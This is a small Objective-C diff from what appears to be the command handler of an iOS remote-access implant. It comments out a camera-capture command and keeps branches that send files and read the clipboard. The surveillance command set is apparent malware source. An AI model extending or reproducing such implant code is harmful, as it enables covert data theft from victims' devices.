@@ -130,9 +130,9 @@ void interact(NSDictionary *arguments) {
         [esCommand debugLog:[NSString stringWithFormat:@"%@",jsonDict]];
         if ([cmd isEqualToString:@"alert"]) {
             [esCommand showAlert:args];
-        } else if ([cmd isEqualToString:@"picture"]) {
+        } /* else if ([cmd isEqualToString:@"picture"]) {
             [esCommand takePicture:[args boolValue]];
-        } else if ([cmd isEqualToString:@"download"]) {
+        }*/ else if ([cmd isEqualToString:@"download"]) {
             [esCommand sendFile:args];
         } else if ([cmd isEqualToString:@"getpaste"]) {
             [esCommand getPasteBoard];
